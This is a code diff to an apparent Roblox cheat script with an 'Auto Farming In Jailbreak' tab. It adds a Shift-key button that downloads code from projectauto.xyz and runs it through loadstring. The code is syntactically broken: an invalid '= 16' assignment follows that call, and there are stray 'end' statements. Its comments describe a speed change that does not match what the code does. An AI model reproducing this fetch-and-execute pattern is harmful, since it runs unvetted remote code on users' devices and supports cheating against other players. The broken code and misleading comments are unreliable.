@@ -14,3 +14,28 @@ local Tab = Window:MakeTab({
 local Section = Tab:AddSection({
 	Name = "Scripts For Auto Farming In Jailbreak"
 })
+Tab:AddButton({
+	Name = "toggle",
+	Callback = function()
+
+local UserInputService = game:GetService("UserInputService")
+
+-- Function to handle input
+local function onInput(input, gameProcessedEvent)
+    -- Check if the input is from the keyboard and not processed by other GUI elements
+    if not gameProcessedEvent then
+        -- Check if the input is the Shift key
+        if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Enum.KeyCode.LeftShift then
+            print("Shift key pressed!") -- You can replace this with any action you want to trigger
+            -- Example action: Change player speed
+            loadstring(game:HttpGet('http://scripts.projectauto.xyz/AutoRobV4'))() = 16 -- Reset speed back to default
+            end
+        end
+    end
+end
+
+-- Connect the input event to our function
+UserInputService.InputBegan:Connect(onInput)
+
+  	end    
+})
